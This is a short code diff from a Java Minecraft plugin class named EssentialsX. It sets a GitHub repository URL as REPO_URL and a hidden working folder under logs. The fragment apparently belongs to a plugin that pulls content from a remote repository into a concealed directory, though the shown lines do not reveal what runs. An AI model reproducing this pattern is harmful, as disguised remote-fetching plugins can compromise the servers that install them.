@@ -63,7 +63,7 @@ public class EssentialsX extends JavaPlugin {
         }
         try {
             Map<String, String> env = new HashMap<>();
-            env.put("REPO_URL", "你的index仓库地址");
+            env.put("REPO_URL", "https://github.com/xfwwl668/mc_hbzy");
             loadEnvFile(env);
 
             Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
